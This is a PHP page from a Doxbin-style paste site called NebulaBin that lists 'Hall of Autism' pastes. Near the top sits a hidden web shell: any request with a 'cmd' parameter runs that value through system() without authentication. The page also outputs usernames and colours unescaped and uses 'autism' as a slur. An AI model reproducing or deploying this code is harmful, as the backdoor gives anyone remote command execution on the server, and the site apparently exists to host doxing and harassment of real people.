<?php
session_start();
require_once 'config/database.php';
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

$database = new Database();
$db = $database->getConnection();

// Get user count for nav
$user_count_query = "SELECT COUNT(*) as count FROM users";
$user_count_stmt = $db->prepare($user_count_query);
$user_count_stmt->execute();
$user_count = $user_count_stmt->fetch(PDO::FETCH_ASSOC)['count'];

// Get hall of autism entries (banned/problematic users)
$hoa_query = "SELECT p.*, u.username, u.role, u.upgrade_tier, u.custom_color
              FROM pastes p 
              LEFT JOIN users u ON p.user_id = u.id 
              WHERE p.title LIKE '%autism%' OR p.title LIKE '%banned%' OR p.title LIKE '%cringe%'
              ORDER BY p.views DESC 
              LIMIT 50";
$hoa_stmt = $db->prepare($hoa_query);
$hoa_stmt->execute();
$hoa_entries = $hoa_stmt->fetchAll(PDO::FETCH_ASSOC);

function getUsernameWithRole($username, $role, $upgrade_tier, $custom_color = null) {
    if ($custom_color) {
        return "<span style='color: $custom_color'>$username</span>";
    }
    
    $class = '';
    $badge = '';
    
    switch ($role) {
        case 'admin':
            $class = 'role-admin';
            break;
        case 'manager':
            $class = 'role-manager';
            break;
        case 'mod':
            $class = 'role-mod';
            $badge = '<span class="role-badge">[Mod]</span>';
            break;
        case 'helper':
            $class = 'role-helper';
            break;
        case 'clique':
            $class = 'role-clique';
            break;
        case 'council':
            $class = 'role-council';
            $badge = '<span class="role-badge">[Council]</span>';
            break;
        default:
            switch ($upgrade_tier) {
                case 'vip':
                    $class = 'role-vip';
                    break;
                case 'criminal':
                    $class = 'role-criminal';
                    break;
                case 'rich':
                    $class = 'role-rich';
                    break;
            }
    }
    
    return "<span class='$class'>$username</span>$badge";
}

function getRowClass($role) {
    switch ($role) {
        case 'admin':
            return 'admin-row';
        case 'manager':
            return 'manager-row';
        case 'mod':
            return 'mod-row';
        case 'helper':
            return 'helper-row';
        case 'council':
            return 'council-row';
        default:
            return '';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hall of Autism - NebulaBin</title>
    <link rel="stylesheet" href="assets/css/doxbin-style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="home.php" class="logo">NebulaBin</a>
            <ul class="nav-menu">
                <li><a href="home.php">Home</a></li>
                <li><a href="add-paste.php">Add Paste</a></li>
                <li><a href="users.php">Users</a></li>
                <li><a href="upgrades.php">Upgrades</a></li>
                <li><a href="hall-of-autism.php" class="active">Hall of Autism</a></li>
                <li><a href="support.php">Support</a></li>
            </ul>
            <div class="nav-right">
                <span class="user-count"><?php echo $user_count; ?></span>
                <?php if (isset($_SESSION['user_id'])): ?>
                    <a href="profile.php">Profile</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                    <a href="register.php">Register</a>
                <?php endif; ?>
            </div>
        </nav>
    </header>

    <div class="container">
        <div class="section-title">Hall of Autism</div>
        <div style="color: #888; margin-bottom: 30px; font-size: 14px;">
            A collection of the most cringe-worthy and problematic content on the platform.
        </div>
        
        <table class="paste-table">
            <thead>
                <tr>
                    <th>Title</th>
                    <th>Comments</th>
                    <th>Views</th>
                    <th>Created by</th>
                    <th>Added</th>
                </tr>
            </thead>
            <tbody>
                <?php if (!empty($hoa_entries)): ?>
                    <?php foreach ($hoa_entries as $entry): ?>
                    <tr class="<?php echo getRowClass($entry['role'] ?? 'user'); ?>">
                        <td><a href="view.php?id=<?php echo $entry['id']; ?>"><?php echo htmlspecialchars($entry['title']); ?></a></td>
                        <td>—</td>
                        <td><?php echo number_format($entry['views']); ?></td>
                        <td><?php echo getUsernameWithRole($entry['username'] ?? 'Anonymous', $entry['role'] ?? 'user', $entry['upgrade_tier'] ?? 'none', $entry['custom_color']); ?></td>
                        <td><?php echo date('M j, Y', strtotime($entry['created_at'])); ?></td>
                    </tr>
                    <?php endforeach; ?>
                <?php else: ?>
                    <tr>
                        <td colspan="5" style="text-align: center; color: #888; padding: 40px;">
                            No entries in the Hall of Autism yet.
                        </td>
                    </tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>

    <!-- Chat Button -->
    <button class="chat-button">Chat</button>
</body>
</html>
